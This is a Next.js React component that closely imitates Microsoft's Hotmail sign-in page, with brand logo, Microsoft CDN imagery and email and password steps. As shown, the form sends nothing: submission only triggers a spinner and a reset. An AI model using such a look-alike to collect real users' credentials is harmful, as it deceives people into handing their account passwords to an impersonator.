"use client";

import Image from "next/image";
import Link from "next/link";
import { Suspense, useState } from "react";

import Microsoft from "../../public/Microsoft_logo_(2012).png";
import ToolTip from "../../public/question.png";
import Back from "../../public/back.png";
import MicrosoftLoading from "../component/MicrosoftLoading";

// import { Metadata } from "../hotmail/Hotmail_meta";

export default function Hotmail() {
  const [email, setEmail] = useState(true);
  const [emailValue, setEmailValue] = useState("");
  const [password, setPassword] = useState(false);
  const [overlay, setOverlay] = useState(false);
  const [loading, setLoading] = useState(false);

  const togglePassword = (e) => {
    e.preventDefault();

    setEmailValue("mail@mail.com");
    setEmail(false);
    setPassword(true);
  };

  const submitForm = (e) => {
    e.preventDefault();
    setLoading(true);

    setTimeout(() => {
      setPassword(false);
      setEmail(true);
      setLoading(false);
    }, 3000);
  };

  const toggleOverlay = () => {
    setOverlay(true);
  };
  return (
    <>
      {loading && <MicrosoftLoading />}
      <section className="hotmail-container relative m-0   md:bg-gradient-to-br from-[#e7d0c0] via-green-100 to-[#f7eedf]">
        <div className="relative  min-h-screen flex flex-col justify-start md:justify-center  md:items-center gap-2 lg:gap-5 m-0 ">
          <div className=" bg-white flex flex-col gap-5 w-full md:w-1/2  lg:w-1/3 md:shadow-md p-7 lg:p-7 h-[23rem] overflow-hidden">
            <div className="flex m-0 lg:ml-5">
              <Image
                src={Microsoft}
                alt="Microsoft"
                id="logo"
                width={150}
                height={150}
                className="justify-self-start"
              />
            </div>

            <form
              className=" flex flex-col mx-auto w-full lg:w-11/12"
              onSubmit={submitForm}
              // action=""
              // method="post"
            >
              <div
                className={`${
                  email
                    ? "transform translate-x-0 opacity-100"
                    : "transform -translate-x-full opacity-0"
                } transition-all duration-500 ease-in-out email-container  form  flex flex-col  gap-5`}
              >
                {email ? (
                  <>
                    <h1 className="title  text-3xl font-black m-0">Sign in</h1>

                    <div
                      className={`${
                        email ? "flex" : "hidden"
                      } flex-col gap-3 border-0`}
                    >
                      <div className="hidden m-0 text-red-700">
                        {/* Error */}
                      </div>
                      <input
                        type="email"
                        name="email"
                        id="email"
                        placeholder="Email, phone, or Skype"
                        className="text-[14px] border-0 border-b-black border-b outline-0  focus:outline-none  focus:ring-0 pl-0"
                      />
                    </div>

                    <div className="flex flex-row gap-2 text-xs">
                      <span>No account?</span>
                      <Link href="" className="text-[#0b63ac]">
                        Create one!{" "}
                      </Link>
                    </div>

                    <div className="flex flex-row gap-2 items-center text-xs">
                      <Link href="" className="text-[#0b63ac]">
                        Sign in with a security key
                      </Link>

                      <Image
                        src={ToolTip}
                        width={20}
                        height={20}
                        alt="Tool tip thumbnail"
                        className="cursor-pointer"
                        onClick={toggleOverlay}
                      />
                    </div>

                    <div className="flex justify-end">
                      <button
                        onClick={togglePassword}
                        className="bg-[#0b63ac] text-white text-sm font-medium p-3 w-1/3 "
                      >
                        Next
                      </button>
                    </div>
                  </>
                ) : (
                  ""
                )}
              </div>

              <div
                className={`${
                  password
                    ? "transform translate-x-0 opacity-100"
                    : "transform translate-x-full opacity-0"
                } transition-all duration-500 ease-in-out rounded  w-full password-container  form  flex flex-col gap-5 `}
              >
                {password ? (
                  <>
                    <div className="flex flex-row gap-2 items-center text-xs ml-3">
                      <Image
                        src={Back}
                        width={20}
                        height={20}
                        alt="Go back button"
                        onClick={() => {
                          setEmail(true);
                          setPassword(false);
                        }}
                      />
                      {emailValue.length > 0 && <span> {emailValue} </span>}
                    </div>

                    <h1 className="flex items-start text-3xl font-black">
                      Enter Password
                    </h1>

                    <div
                      className={`relative ${
                        password ? "flex" : "hidden"
                      } flex-col gap-5 border-0`}
                    >
                      <div className="hidden m-0 text-red-700">
                        {/* Error */}
                      </div>
                      <input
                        type="password"
                        name="password"
                        id="password"
                        placeholder="Password"
                        className="text-[14px] border-0 border-b-black border-b outline-0  focus:outline-none  focus:ring-0 pl-0"
                      />
                    </div>

                    <Link href="" className="text-xs text-[#0b63ac]">
                      Forgotten your password?
                    </Link>

                    <div className="flex justify-end">
                      <button
                        onClick={submitForm}
                        className="bg-[#0b63ac] text-white text-sm font-medium p-3 w-1/3 "
                      >
                        Sign in
                      </button>
                    </div>
                  </>
                ) : (
                  ""
                )}
              </div>
            </form>
          </div>

          {!password && (
            <div className="bg-white flex  flex-row self-center items-center gap-3 w-[85%] md:w-1/2 lg:w-1/3 border border-black md:border-0  md:pl-16 p-1 md:p-2 my-3 md:shadow-md">
              <Image
                src="https://logincdn.msftauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg"
                alt="Key"
                width={35}
                height={35}
                className=""
              />

              <a href="#" className="text-gray-700 text-sm">
                Sign-in options
              </a>
            </div>
          )}
        </div>
      </section>
    </>
  );
}
